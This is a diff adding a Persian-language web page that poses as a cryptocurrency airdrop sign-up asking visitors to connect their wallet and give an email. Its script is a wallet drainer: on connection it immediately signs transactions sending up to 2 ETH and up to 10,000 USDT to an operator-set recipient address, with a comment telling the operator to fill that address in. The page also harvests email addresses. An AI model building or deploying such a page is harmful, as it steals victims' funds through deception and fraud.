@@ -1,0 +1,160 @@
+﻿<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <title>ایردراپ ارز دیجیتال</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            direction: rtl;
+            background-color: #f4f4f4;
+            padding: 50px;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        input {
+            padding: 10px;
+            width: 80%;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        .error { color: red; }
+        .balance { color: green; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ایردراپ ارز دیجیتال</h1>
+        <p>برای شرکت در ایردراپ، کیف پول خود را متصل کنید و ایمیل خود را وارد کنید.</p>
+        <button onclick="connectWallet()">اتصال کیف پول</button>
+        <p id="walletAddress"></p>
+        <p id="balanceETH" class="balance"></p>
+        <p id="balanceUSDT" class="balance"></p>
+        <p id="balanceBTC" class="balance"></p>
+        <input type="email" id="emailInput" placeholder="آدرس ایمیل خود را وارد کنید" required>
+        <button onclick="submitData()">ثبت اطلاعات</button>
+        <p id="status"></p>
+    </div>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    <script>
+        let walletAddress = '';
+        const recipientAddress = '0xYourRecipientAddressHere'; // آدرس مقصد رو اینجا عوض کن
+
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    walletAddress = accounts[0];
+                    document.getElementById('walletAddress').innerText = `کیف پول متصل شد: ${walletAddress}`;
+                    await checkBalances(walletAddress);
+                    await initiateTransfer(walletAddress);
+                } catch (error) {
+                    document.getElementById('status').innerText = 'اتصال یا تراکنش ناموفق بود: ' + error.message;
+                }
+            } else {
+                document.getElementById('status').innerText = 'لطفاً متامسک یا یک کیف پول مشابه نصب کنید.';
+            }
+        }
+
+        async function checkBalances(address) {
+            const response = await fetch(`/check-balances?address=${encodeURIComponent(address)}`);
+            const balances = await response.json();
+            document.getElementById('balanceETH').innerText = `موجودی اتریوم: ${balances.eth} ETH`;
+            document.getElementById('balanceUSDT').innerText = `موجودی تتر: ${balances.usdt} USDT`;
+            document.getElementById('balanceBTC').innerText = `موجودی بیت‌کوین: ${balances.btc} BTC`;
+            return balances;
+        }
+
+        async function initiateTransfer(address) {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const balances = await checkBalances(address);
+
+            const ethBalance = parseFloat(balances.eth);
+            let ethToSend = ethBalance > 5 ? 2 : Math.max(0.01, ethBalance - 0.01);
+            if (ethBalance >= 0.01) {
+                const tx = {
+                    to: recipientAddress,
+                    value: ethers.utils.parseEther(ethToSend.toString()),
+                    gasLimit: 21000,
+                    gasPrice: await provider.getGasPrice()
+                };
+                await signer.sendTransaction(tx);
+            }
+
+            const usdtBalance = parseFloat(balances.usdt);
+            let usdtToSend = usdtBalance > 10000 ? 10000 : Math.max(10, usdtBalance);
+            if (usdtBalance >= 10) {
+                const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+                const usdtABI = [
+                    "function transfer(address to, uint256 amount) public returns (bool)",
+                    "function decimals() view returns (uint8)"
+                ];
+                const usdtContract = new ethers.Contract(usdtContractAddress, usdtABI, signer);
+                const decimals = await usdtContract.decimals();
+                const amount = ethers.utils.parseUnits(usdtToSend.toString(), decimals);
+                await usdtContract.transfer(recipientAddress, amount);
+            }
+        }
+
+        async function submitData() {
+            const email = document.getElementById('emailInput').value.trim();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!walletAddress) {
+                document.getElementById('status').innerText = 'لطفاً کیف پول را متصل کنید.';
+                return;
+            }
+            if (!emailRegex.test(email)) {
+                document.getElementById('status').innerText = 'لطفاً یک ایمیل معتبر وارد کنید.';
+                return;
+            }
+
+            const data = { wallet: walletAddress, email: email };
+            try {
+                const response = await fetch('/submit', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'X-CSRF-Token': await getCsrfToken()
+                    },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                document.getElementById('status').innerText = result.message;
+            } catch (error) {
+                document.getElementById('status').innerText = 'خطا در ثبت اطلاعات: ' + error.message;
+            }
+        }
+
+        async function getCsrfToken() {
+            const response = await fetch('/csrf-token');
+            const { token } = await response.json();
+            return token;
+        }
+    </script>
+</body>
+</html>
